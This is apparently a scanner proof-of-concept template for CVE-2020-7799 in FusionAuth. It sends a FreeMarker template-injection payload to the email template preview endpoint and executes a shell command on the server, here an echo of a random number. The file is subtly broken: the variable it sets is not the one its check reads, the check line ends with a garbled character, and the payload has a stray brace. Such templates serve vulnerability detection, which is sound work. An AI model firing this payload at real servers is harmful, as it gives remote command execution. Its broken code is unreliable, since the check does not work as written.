name: poc-yaml-apache-fusionauth-cve-2020-7799-rce
set:
  r: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /ajax/email/template/preview
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
      Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 796
      DNT: 1
      Connection: close
      Referer: request.url + /admin/email/template/edit/2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b
      Cookie: JSESSIONID=FA9DB3CBABA6B37E5336AE4B96001807;
    body: primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&emailTemplate.name=COPPA%20Notice&emailTemplate.defaultSubject=Notice%20of%20your%20consent&emailTemplate.fromEmail=no-reply%40fusionauth.io&emailTemplate.defaultFromName=FusionAuth&emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%2Fexample.com%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&emailTemplate.defaultHtmlTemplate=${"freemarker.template.utility.Execute"?new()("echo {{r}}")}}
    follow_redirects: true
    expression: >
      response.status == 200 && response.body.bcontains(bytes(string(rand))ï¼‰
detail:
  author: rocky
  links:
    - https://github.com/ianxtianxt/CVE-2020-7799/
